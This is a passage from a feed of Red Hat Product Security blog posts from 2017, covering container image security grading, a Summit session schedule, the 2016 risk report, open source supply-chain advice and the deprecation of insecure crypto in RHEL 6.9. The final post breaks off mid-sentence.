href=\"https://access.redhat.com/articles/2968471\">Certain vulnerabilities need special attention</a> sometimes because they are truly severe and sometimes because we feel the need to dispel some <a href=\"https://access.redhat.com/blogs/product-security/posts/1976583\">myth involving scary logos and catchy names</a>.  Those get a more detailed article in the <a href=\"https://access.redhat.com/security/vulnerabilities\">Vulnerability Responses</a> section of the Portal.  Logged-in users that have active Red Hat Subscriptions can also proceed to the <a href=\"https://www.redhat.com/wapps/ugc/protected/notif.html\">notifications area of the Customer Portal</a> and select from a nice amount of errata notification options to receive more personalized notifications.</p>\n<p>For those interested in automation, in addition to the usual <a href=\"https://www.redhat.com/security/data/metrics/\">machine-consumable CVRF and OVAL data</a> we have been providing for years, we also provide a <a href=\"https://access.redhat.com/blogs/766093/posts/2387601\">Security Data API</a> that everyone is welcome to make reasonable use of and easily query for many kinds of security information they are interested in regarding our products.</p>\n<p>As can be seen, there are many options for consuming our published security advisory information.  This continues our tradition of providing objective and timely security advice as transparently and openly as possible, something Red Hat Product Security is very proud of.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3032761\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    advisory-messages    errata    security</div>","pubDate":"Wed, 17 May 2017 13:30:00 +0000","dc:creator":"Fabio Olive Leite","guid":{"@isPermaLink":"false","#text":"3032761 at https://access.redhat.com"}},{"title":"Security Scoring and Grading for Container Images","link":"https://access.redhat.com/blogs/product-security/posts/container-security-scoring","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>We have just rolled out an update to the interface of the <a href=\"https://access.redhat.com/containers\">Red Hat Container Catalog</a> that attempts to answer to the question of whether or not a particular container image available in the Container Catalog can be considered secure.  In the interests of transparency providing as much information as available to deploy the right container image for their needs, we are excited about these new capabilities in the Red Hat Container Catalog and wanted to give a little insight on our rationale.</p>\n<p>Vulnerability scoring and rating is nothing new in the security ecosystem.  We rate the severity of vulnerabilities using our <a href=\"https://access.redhat.com/security/updates/classification\">four-point security rating scale</a> where an individual flaw can be rated as Critical, Important, Moderate, or Low.  Security errata (RHSA) that are released also are assigned an impact rating based on the highest impact rating of the flaws being fixed in the erratum.  These ratings are based solely on the merit of the flaw itself, without any concept of possible impact over time (for example, a Moderate-rated flaw remains Moderate forever because the flaw itself is being rated).  While exploitability comes into account when the flaw rating is assigned (in terms of whether it is wormable, remotely exploitable, locally exploitable, etc.), we don’t look at the risk of exploitation over time when assessing it.</p>\n<p>Container images, being a static selection of software for a specific purpose, subtly change the way flaws should be rated.  The security of a container image is not based on the concept of an isolated system on the host.  Users should not expect a container image to remain secure indefinitely.  The older a container image, the higher the probability of it containing a security exposure.</p>\n<p>Curtis Yanko from Sonatype, during a talk at Red Hat Summit 2016 entitled \"<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DUjUEv02kPZ4%26feature%3Dyoutu.be%26t%3D2001\">Secure Your Enterprise Software Supply Chain with Containers</a>\" was quoted as saying that \"code ages like milk, not like wine.\"  When we were looking at how to rate or score container images, we felt that this explained it quite well: containers age like milk, not like wine.  Old, stale containers are much more likely to contain security risks, while new, fresh containers are less likely.  The Red Hat Container Catalog (or more specifically the “Container Health Index”) will rate the container images based on known security flaws and the length of time the software in the container images is exposed to those flaws.  Because container trust is temporal, we chose to grade container images with a simple time-based rating system rather than just a vulnerability-based one.</p>\n<p>The challenges we faced were to make sure that at a glance the grade was relevant and easy to understand.  It had to account for known security exposures and associated age, but could not account for individual users’ relevant risk as we do not know what individual users may be doing with any given container (we can’t know if it is performing some critical action or running a critical service).  Each user needs to determine risk based on the Container Health Index, their use-case and any other information available to them.</p>\n<p>So, using the line of thought that fresh containers are better than older ones, we use a grading system of A through F to describe the freshness of a container image and associated security exposures.  Specifically, the age and the criticality (rated Critical or Important) of the oldest flaw that is applicable to the container image.</p>\n<p>As container images age, the scores get worse:</p>\n<ul>\n<li><strong>Grade A</strong>: This image does not have any unapplied Critical or Important security errata</li>\n<li><strong>Grade B</strong>: This image is affected by Critical (no older than 7 days) or Important (no older than 30 days) security errata</li>\n<li><strong>Grade C</strong>: This image is affected by Critical (no older than 30 days) or Important (no older than 90 days) security errata</li>\n<li><strong>Grade D</strong>: This image is affected by Critical (no older than 90 days) or Important (no older than 12 months) security errata</li>\n<li><strong>Grade E</strong>: This image is affected by Critical or Important security errata no older than 12 months</li>\n<li><strong>Grade F</strong>: This image is affected by Critical or Important security errata older than 12 months</li>\n<li><strong>Unknown</strong>: This image is missing metadata required to calculate a grade and cannot be scanned</li>\n</ul>\n<p>For example, a Grade A container image does not contain known unapplied errata that fix Critical or Important flaws, although the container image may have missing errata that fix Moderate or Low flaws.  Ideally you will always be running Grade A containers.</p>\n<p>Container images of Grade B may be missing errata that fix flaws of Critical or Important rating, however no missing Critical flaw is older than 7 days and no missing Important flaw is older than 30 days.  The number of days is based on the initial date an erratum was released to fix the flaw.</p>\n<p>Currently, the information that is required to generate this grade is based on Red Hat errata published for Red Hat products that are available in the RPM packaging format.  Containers that include other software layered on top of a Red Hat RPM-based base layer are not included in the grade.  In this case, you will need to consider the possible impact of the ungraded components with the underlying container image’s grade and the age of the container itself to determine what is acceptable for you.</p>\n<p>While we would love to provide similar ratings to all container images, we currently only rate Red Hat RPM-based container images because of the data available for analysis.  We hope to continue to build on the breadth of analytics available on the Red Hat Container Catalog.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3013221\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    containers</div>","pubDate":"Tue, 25 Apr 2017 16:26:09 +0000","dc:creator":"Vincent Danen","guid":{"@isPermaLink":"false","#text":"3013221 at https://access.redhat.com"}},{"title":"Join us at Red Hat Summit 2017","link":"https://access.redhat.com/blogs/766093/posts/3005461","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>As you’ve probably heard, this year’s <a href=\"http://www.redhat.com/en/summit/2017\">Red Hat Summit</a> is in Boston May 2-4. Product Security is looking forward to taking over multiple sessions and activities over the course of those 3 days, and we wanted to give you a sneak peek of what we have planned.</p>\n<h2>Sessions</h2>\n<p>There will be A LOT of Product Security sessions including:</p>\n<h3>Tuesday, May 2</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Session Title</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>10:15-11:00AM</td>\n<td>L102598 - Practical OpenSCAP—Security standard compliance and reporting</td>\n<td>Room 252B</td>\n</tr>\n<tr>\n<td>10:15-11:00AM</td>\n<td>S102106 - Red Hat security roadmap</td>\n<td>Room 156AB</td>\n</tr>\n<tr>\n<td>10:15-11:00AM</td>\n<td>S104999 - A greybeard's worst nightmare— How Kubernetes and Docker containers are re-defining the Linux OS</td>\n<td>Room 104AB</td>\n</tr>\n<tr>\n<td>11:30AM-12:15PM</td>\n<td>B104934 - The age of uncertainty: how can we make security better</td>\n<td>Room 158</td>\n</tr>\n<tr>\n<td>11:30AM-12:15PM</td>\n<td>S105019 - Red Hat container technology strategy</td>\n<td>Room 153A</td>\n</tr>\n<tr>\n<td>12:45-1:15PM</td>\n<td>Security + Red Hat Insights</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>3:30-4:15PM</td>\n<td>P102235 - The Furry and the Sound: A mock disaster security vulnerability fable</td>\n<td>Room 156AB</td>\n</tr>\n<tr>\n<td>3:30-4:15PM</td>\n<td>S102603 - OpenShift Roadmap: What's New &amp; What's Next!</td>\n<td>Room 153B</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>B103109 - How to survive the Internet of Things: Security</td>\n<td>Room 155</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>S104047 - The roadmap for a security-enhanced Red Hat OpenStack Platform</td>\n<td>Room 151A</td>\n</tr>\n</tbody>\n</table>\n<h3>Wednesday, May 3</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Session Title</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>10:15-11:00AM</td>\n<td>S105084 - Security-Enhanced Linux for mere mortals</td>\n<td>Room 104AB</td>\n</tr>\n<tr>\n<td>11:30AM-12:15PM</td>\n<td>S103850 - Ten layers of container security</td>\n<td>Room 156C</td>\n</tr>\n<tr>\n<td>3:30-4:14PM</td>\n<td>LT122001 - Lightning Talks: Infrastructure security</td>\n<td>Room 101</td>\n</tr>\n<tr>\n<td>3:30-5:30PM</td>\n<td>L99901 - A practical introduction to container security</td>\n<td>Room 251</td>\n</tr>\n<tr>\n<td>3:40-4:00PM</td>\n<td>Container Catalog Quick Talk</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>LT122006 - Red Hat Satellite lightning talks</td>\n<td>Room 101</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>S102068 - DevSecOps the open source way</td>\n<td>Room 104C</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>S104105 - Securing your container supply chain</td>\n<td>Room 153B</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>S104897 - Easily secure your front- and back-end applications with KeyCloak</td>\n<td>Room 153A</td>\n</tr>\n</tbody>\n</table>\n<h3>Thursday, May 4</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Session Title</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>9:50-10:10AM</td>\n<td>Risk Report Quick Talk</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>10:15-11:00AM</td>\n<td>S111009 - Partner session: Microsoft</td>\n<td>Room 105</td>\n</tr>\n<tr>\n<td>10:15-11:00AM</td>\n<td>S103174 - Automating security compliance for physical, virtual, cloud, and container environments with Red Hat CloudForms, Red Hat Satellite, and Ansible Tower by Red Hat</td>\n<td>Room 157C</td>\n</tr>\n<tr>\n<td>10:15AM-12:15PM</td>\n<td>L100049 - Practical SELinux: Writing custom application policy</td>\n<td>Room 252B</td>\n</tr>\n<tr>\n<td>11:30AM-12:15PM</td>\n<td>S102840 - The security of cryptography</td>\n<td>Room 156C</td>\n</tr>\n<tr>\n<td>11:30AM-12:15PM</td>\n<td>B103948 - DirtyCow: A game changer?</td>\n<td>Room 155</td>\n</tr>\n<tr>\n<td>3:30-4:15PM</td>\n<td>B103901 - Perfect Security: A dangerous myth? System security for open source</td>\n<td>Room 155</td>\n</tr>\n<tr>\n<td>3:30-5:30PM</td>\n<td>L105190 - Proactive security compliance automation with CloudForms, Satellite, OpenSCAP, Insights, and Ansible Tower</td>\n<td>Room 254A</td>\n</tr>\n<tr>\n<td>4:30-5:15PM</td>\n<td>S104110 - An overview and roadmap of Red Hat Development Suite</td>\n<td>Room 102A</td>\n</tr>\n</tbody>\n</table>\n<h2>Games!</h2>\n<p>We are pleased to announce we will be hosting a series of games in Participation Square at Summit that will cover all things security including recent vulnerabilities, product enhancements and more. Come test your knowledge, and win some awesome prizes in the process!</p>\n<p>Our games will be live at the following times, so mark your calendars!</p>\n<h3>Tuesday, May 2</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Game</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>11:10-11:50AM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>1:05-1:45PM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>3:00-3:30PM</td>\n<td>Flawed &amp; Branded Card Game</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>5:00-5:30PM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>6:30-7:00PM</td>\n<td>Flawed &amp; Branded Card Game</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n</tbody>\n</table>\n<h3>Wednesday, May 3</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Session Title</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1:00-1:45PM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>5:00-5:45PM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>5:50-6:20PM</td>\n<td>Flawed &amp; Branded Card Game</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n</tbody>\n</table>\n<h3>Thursday, May 4</h3>\n<table>\n<thead>\n<tr>\n<th>Time</th>\n<th>Session Title</th>\n<th>Room</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>11:35AM-12:05PM</td>\n<td>Flawed &amp; Branded Card Game</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n<tr>\n<td>12:10-1:00PM</td>\n<td>Product Security Game Show</td>\n<td>Expert Exchange at Participation Square, Partner Pavilion</td>\n</tr>\n</tbody>\n</table>\n<p>We are looking forward to connecting with you in Boston! Hope to see you there.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3005461\"></div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    summit</div>","pubDate":"Wed, 19 Apr 2017 13:30:00 +0000","dc:creator":"Christopher Robinson","guid":{"@isPermaLink":"false","#text":"3005461 at https://access.redhat.com"}},{"title":"Customer security awareness: alerting you to vulnerabilities that are of real risk","link":"https://access.redhat.com/blogs/766093/posts/2950971","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Every day we are bombarded with information. Something is always happening somewhere to someone and unfortunately it's rarely good. Looking at this through the lens of information security, NOT getting the right details at the appropriate time could be the difference from stopping and blocking an attack, or being the next sad, tragic headline...</p>\n<p>Red Hat Product Security oversees the vulnerability remediation for all of Red Hat's products. Our dual mission of governing guidelines and standards for how our products are composed and delivered is balanced with our in-taking, assessing, and responding to information about security vulnerabilities that might impact those products. Once a flaw has been identified, part of our role is to understand its real impact and try to produce a calm, clear direction to get issues that matter remediated. One big challenge is understanding when something is bad and <em>could</em> cause harm compared with  something that is completely terrible and WILL cause major havoc out “in the wild.\" For the layperson, the facts and the hype can be extremely difficult and time-consuming to separate so that they can act appropriately.</p>\n<p>Recent trends in the security field haven't been helping. It seems as if every month there is a new bug that has a cute name, a logo, and a webstore selling stickers and stuffed animals. While awareness of a problem is an excellent goal, oftentimes the flashing blinky text and images obscure how bad (or not) an issue is.</p>\n<p>Thankfully, for over 15 years Red Hat Product Security has been providing calm, accurate, timely advice around these types of issues. We're able to separate the hope from the hype, so to speak. To that end, with the <a href=\"https://access.redhat.com/blogs/product-security/posts/1976583\">meteoric rise of “branded” flaws</a> not stopping in the foreseeable future, Red Hat Product Security developed a special process to help inform our valued subscribers and partners when these situations arise. We call it our Customer Security Awareness (CSAw) process:</p>\n<p><img src=\"/sites/default/files/customer_security_awareness_workflow.png?itok=l7iY_GbU\" alt=\"\" class=\"image-large\" /></p>\n<p>We've augmented our processes to include enhanced oversight and handling of these very special issues. Some of these issues could be of such grave risk the need for quick actions and good advice merits extra special handling.  Other times we might  recognize that a security bug has the potential to have it's own PR agent, we take the right steps so that customers proactively get the appropriate level of information, allowing them to decide how quickly they need to react based on their own risk appetites. We ensure we provide special tools and extra alerts so that when these things really DO matter, the decision makers have the right data to move forward.</p>\n<p>For more details about the process, please check out the <a href=\"https://access.redhat.com/security\">Red Hat Product Security Center</a> or reach out to us via secalert@redhat.com or our Twitter Account <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Ftwitter.com%2FRedHatSecurity\">@RedHatSecurity</a>.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2950971\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div>","pubDate":"Wed, 22 Mar 2017 13:30:00 +0000","dc:creator":"Christopher Robinson","guid":{"@isPermaLink":"false","#text":"2950971 at https://access.redhat.com"}},{"title":"Red Hat Product Security Risk Report 2016","link":"https://access.redhat.com/blogs/766093/posts/2957221","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>At Red Hat, our dedicated <a href=\"https://access.redhat.com/security/team/\">Product Security team</a> analyzes threats and vulnerabilities against all our products and provides relevant advice and updates through the Red Hat Customer Portal. Customers can rely on this expertise to help them quickly address the issues that can cause high risks and avoid wasting time or effort on those that don’t.</p>\n<p>Red Hat delivers certified, signed, supported versions of the open source solutions that enable cost-effective innovation for the enterprise. This is the Red Hat value chain.</p>\n<p>This report explores the state of security risk for Red HatⓇ products for calendar year 2016. We look at key metrics, specific vulnerabilities, and the most common ways that security issues affected users of Red Hat products.</p>\n<p>Among our findings:</p>\n<ul>\n<li>\n<p>Looking only at issues affecting base <a href=\"https://access.redhat.com/products/red-hat-enterprise-linux/\">Red Hat Enterprise LinuxⓇ</a> releases, we released 38 <a href=\"https://access.redhat.com/security/updates/classification/\">Critical</a> security advisories addressing 50 Critical vulnerabilities. Of those issues, 100% had fixes the same or next day after the issue was public.</p>\n</li>\n<li>\n<p>During that same timeframe, across the whole Red Hat portfolio, 76% of Critical issues had updates to address them the same or next day after the issue was public with 98% addressed within a week of the issue being public.</p>\n</li>\n<li>\n<p>A catchy name or a flashy headline for a vulnerability doesn't tell much about its risk. The Red Hat Product Security Team helps customers determine a vulnerability’s actual impact. Most 2016 issues that mattered were not branded.</p>\n</li>\n</ul>\n<p><img src=\"/sites/default/files/su-2016-security-risk-report-graphics-f6404cw-20170306c_-figure-4.png?itok=bgWUZvwj\" alt=\"\" class=\"image-large\" /></p>\n<h2>Vulnerabilities</h2>\n<p>Across all Red Hat products, and for all issue severities, we fixed more than 1,300 vulnerabilities<sup id=\"fnref:1\"><a href=\"#fn:1\" class=\"footnote-ref\">1</a></sup> by releasing more than 600 security advisories in 2016. Critical<sup id=\"fnref:2\"><a href=\"#fn:2\" class=\"footnote-ref\">2</a></sup> vulnerabilities pose the most risk to an organization. Most Critical vulnerabilities occur in browser or browser components, so Red Hat Enterprise Linux server installations will generally be affected by far fewer critical vulnerabilities. One way customers can reduce risk when using our modular products is to make sure they install the right variant and review the package set to remove packages they don’t need.</p>\n<h2>The Red Hat value chain</h2>\n<p>Red Hat products are based on open source software. Some Red Hat products contain several thousand individual packages, each of which is based on separate, third-party software from upstream projects.</p>\n<p>Red Hat engineers play a part in many upstream components, but handling and managing vulnerabilities across thousands of third-party components is a significant task. Red Hat has a dedicated Product Security team that monitors issues affecting Red Hat products and works closely with upstream projects.</p>\n<p>For more than 15 years, Red Hat Product Security has been a recognized leader in fixing security flaws across the Linux stack. In 2016, we investigated more than 2,600 vulnerabilities that potentially affected parts of our products, leading to fixes for 1,346 vulnerabilities. That’s a 30% increase over 2015, when the team investigated 2,000.</p>\n<p>Vulnerabilities known to Red Hat in advance of being made public are known as “under embargo.” Unlike companies shipping proprietary software, Red Hat is not in sole control of the date each flaw is made public. This is a good thing, as it leads to much shorter times between when a flaw is first reported and when it becomes public. Shorter embargo periods make flaws much less valuable to attackers. They know a flaw in open source is likely to get fixed quickly, shortening their window of opportunity to exploit it.</p>\n<p>For 2016, across all products, we knew about 394 (29%) of the vulnerabilities we addressed before making them public, down slightly from 32% in 2015. We expect this figure to vary from year to year. Across all products and vulnerabilities of all severities known to us in advance, the median embargo was seven days. This is much lower than 2015, when the median embargo was 13 days.</p>\n<p><img src=\"/sites/default/files/su-2016-security-risk-report-graphics-f6404cw-20170306c_-figure-6_0.png?itok=52WQF2L4\" alt=\"\" class=\"image-large\" /></p>\n<p>Figure 2: Red Hat Product Security monitors multiple sources to identify vulnerabilities. The value of your Red Hat subscription at work.</p>\n<p>The <a href=\"https://www.redhat.com/en/resources/2016-product-security-risk-report\">full report</a> is available for download.</p>\n<div class=\"footnotes\">\n<hr />\n<ol>\n<li id=\"fn:1\">\n<p>Red Hat Product Security assigns a Common Vulnerabilities and Exposures (CVE) name to every security issue we fix. In this report, we equate vulnerabilities to CVEs. <a href=\"#fnref:1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn:2\">\n<p>Red Hat rates vulnerabilities on a <a href=\"https://access.redhat.com/security/updates/classification\">four-point scale</a> that shows at a glance how much concern Red Hat has about each security issue. The scale rates vulnerabilities as Low, Moderate, Important, or Critical. By definition, a Critical vulnerability is one that could be exploited remotely and automatically by a worm. However we, like other vendors, also stretch the definition to include those flaws that affect web browsers or plug-ins where a user only needs to visit a malicious (or compromised) website to be exploited. <a href=\"#fnref:2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</div></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2957221\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security    Security-Vulnerabilities</div>","pubDate":"Tue, 07 Mar 2017 14:39:02 +0000","dc:creator":"Red Hat Product Security","guid":{"@isPermaLink":"false","#text":"2957221 at https://access.redhat.com"}},{"title":"Do you know where that open source came from?","link":"https://access.redhat.com/blogs/766093/posts/2913111","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Last year, while speaking at <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.rsaconference.com\">RSA</a>, a reporter asked me about container provenance. This wasn’t the easiest question to answer because there is a lot of nuance around containers and what’s inside them. In response, I asked him if he would eat a sandwich he found on the ground. The look of disgust I got was priceless, but it opened up a great conversation.</p>\n<p>Think about it this way: If there was a ham sandwich on the ground that looked mostly OK, would you eat it? You can clearly see it’s a ham sandwich. The dirt all brushed off. You do prefer wheat bread to white. So what’s stopping you? It was on the ground. Unless you’re incredibly hungry and without any resources, you won’t eat that sandwich. You’ll visit the sandwich shop across the street.</p>\n<p>The other side of this story is just as important though. If you are starving and without money, you’d eat that sandwich without a second thought. I certainly would. Starving to death is far worse than eating a sandwich of questionable origin. This is an example you have to remember in the context of your projects and infrastructure. If you have a team that is starving for time, they aren’t worried about where they get their solutions. For many, making the deadline is far more important than “doing it right.” They will eat the sandwich they find.</p>\n<p>This year at RSA, I’m leading a Peer2Peer session titled, “<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.rsaconference.com%2Fevents%2Fus17%2Fagenda%2Fsessions%2F7117-managing-your-open-source\">Managing your open source</a>.” I keep telling everyone that open source won. It’s used everywhere; there’s no way to escape it anymore. But a low-cost, flexible, and more secure software option must have some kind of hidden downside, right? Is the promise of open source too good to be true? Only if you don’t understand the open source supply chain.</p>\n<p>Open source is everywhere, and that means it’s easily acquirable. From cloning off of github to copying random open source binaries downloaded from a project page, there’s no stopping this sort of behavior. If you try, you will fail. Open source won because it solves real problems and it snuck in the back door when nobody was looking. It’s no secret how useful open source is: by my guesstimates, the world has probably saved trillions in man hours and actual money thanks to all the projects that can be reused. If you try to stop it now it’s either going to go back underground, making the problem of managing your open source usage worse or, worse still, you’re going to have a revolt. Open source is amazing, but there is a price for all this awesome.</p>\n<p>Fundamentally, this is our challenge: How do we empower our teams to make the right choices when choosing open source software?</p>\n<p>We know they’re going to use it. We can’t control every aspect of its use, but we can influence its direction. Anyone who is sensitive to technical debt will understand that open source isn’t a “copy once and forget” solution. It takes care and attention to ensure that you haven’t just re-added <a href=\"https://access.redhat.com/security/cve/CVE-2014-0160\">Heartbleed</a> to your infrastructure. Corporate IT teams need to learn how to be the sandwich shop - how do we ensure that everyone is coming to us for advice and help with open source instead of running whatever they find on the ground? There aren’t easy answers to all of these questions, but we can at least start the discussion.</p>\n<p>In my RSA Peer2Peer session we’re going to discuss what this all means in the modern enterprise:<br />\n- How are you managing your open source?<br />\n- Are you doing nothing?<br />\n- Do you have a program where you vet the open source used to ensure a certain level of quality?<br />\n- How do you determine quality?<br />\n- Are you running a scanner that looks for security flaws?<br />\n- What about the containers or Linux distribution you use, where did that come from, who is taking care of it?<br />\n- How are you installing your open source applications on your Linux or even Windows servers?</p>\n<p>There are a lot of questions, too many to ask in a single hour or day, and far too many to effectively answer over the course of a career in IT security. That’s okay though; we want to start a discussion that I expect will never end.</p>\n<p>See you at <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.rsaconference.com%2Fevents%2Fus17\">RSA on Tuesday February 14, 2017</a> | 3:45 PM - 4:30 PM | Marriott Marquis | Nob Hill C</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2913111\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security</div>","pubDate":"Wed, 08 Feb 2017 14:30:00 +0000","dc:creator":"bressers@redhat.com","guid":{"@isPermaLink":"false","#text":"2913111 at https://access.redhat.com"}},{"title":"Deprecation of Insecure Algorithms and Protocols in RHEL 6.9","link":"https://access.redhat.com/blogs/766093/posts/2787271","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Cryptographic protocols and algorithms have a limited lifetime—much like everything else in technology. Algorithms that provide cryptographic hashes and encryption as well as cryptographic protocols have a lifetime after which they are considered either too risky to use or plain insecure. In this post, we will describe the changes planned for the 6.9 release of Red Hat Enterprise Linux 6, which is already on <a href=\"https://access.redhat.com/support/policy/updates/errata\">Production Phase 2</a>.</p>\n<h2>Balancing Legacy Use Cases and Modern Threats</h2>\n<p>For the RHEL operating system, which has its useful lifetime measured in decades, in addition to adding new features, it is necessary to periodically revisit default settings and phase out (or completely deprecate) protocols and algorithms the use of which—accidental or intentional—could cause irreparable damage. At the same time we must ensure that the vast majority of existing and legacy applications continues to operate without changes, as well as provide mechanisms for the administrator to revert any changes, when necessary, to the previous defaults.</p>\n<h2>What Are the Threats?</h2>\n<p>Given that any change in application or library default settings cannot be without side-effects, it is important to provide the context under which such changes are necessary. In the past few years, we’ve identified several protocol attacks with real-world impact that relied on obsolete and legacy algorithm and protocol configurations. A few prominent attacks are briefly described below:</p>\n<ul>\n<li><a href=\"https://access.redhat.com/security/vulnerabilities/drown\">DROWN in 2016</a>; it relied on servers enabling the SSL 2.0 protocol, allowing the attackers to obtain sufficient information to decrypt other, unrelated TLS sessions.</li>\n<li><a href=\"https://access.redhat.com/articles/2112261\">SLOTH in 2016</a>; it relied on clients enabling the MD5 algorithm, broken since 2004; it allowed attackers to decrypt TLS sessions.</li>\n<li><a href=\"https://access.redhat.com/articles/1456263\">LOGJAM</a> and <a href=\"https://access.redhat.com/articles/1369543\">FREAK</a> in 2015. While the details of the attacks differ, both of these attacks relied on export cryptography being enabled in the server, allowing an attacker to decrypt TLS sessions.</li>\n</ul>\n<h2>Why Would Insecure Configuration Remain Enabled?</h2>\n<p>While all of the exploited protocols and algorithms were known to be obsolete or insecure for more than a decade, the impact of these attacks was still high. That indicates that these obsolete protocols and algorithms were enabled on Internet servers possibly due to:</p>\n<ul>\n<li>misconfiguration,</li>\n<li>administrators’ hope of improving compatibility with legacy clients,</li>\n<li>re-use of old configuration files.</li>\n</ul>\n<p>Traditionally, we have not been very keen on deprecating algorithms and protocols throughout the RHEL timeline to avoid breaking existing and legacy applications. This was because of our belief that for an operating system, keeping operations going on is more important than addressing flaws that may not be applicable on every operating system setup.</p>\n<h2>Solution for RHEL 6.9</h2>\n<p>However, after considering these attacks and the fact that it is unrealistic to expect all administrators to keep up with cryptographic advances, we have decided to provide a protection net, which will prevent future cryptographic attacks due to accidental misconfiguration with legacy algorithms and protocols in default RHEL 6.9 installations.</p>\n<h2>No Export Ciphersuites and SSL 2.0</h2>\n<p>In particular, we will take steps that will ensure that the TLS ciphersuites marked as export, as well as the SSL 2.0 protocol, are completely removed from the operating system. These two points involve algorithms with no real-world use and a protocol that has been considered deprecated for more than 20 years. We will not provide a way to re-enable these options because we are convinced that these are primarily used to attack misconfigured systems rather than for real-world use cases.</p>\n<h2>Limited MD5, RC4, and DH</h2>\n<p>In addition, we will ensure that no application can be used with insecure signature-verification algorithms such as MD5, and that TLS client 